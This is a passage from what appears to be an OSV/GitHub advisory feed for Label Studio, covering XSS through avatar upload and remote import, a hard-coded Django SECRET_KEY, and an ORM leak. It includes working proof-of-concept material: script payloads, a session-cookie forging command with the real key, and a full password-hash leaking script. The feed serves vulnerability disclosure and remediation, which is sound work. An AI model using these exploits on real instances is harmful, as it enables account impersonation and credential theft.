*\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  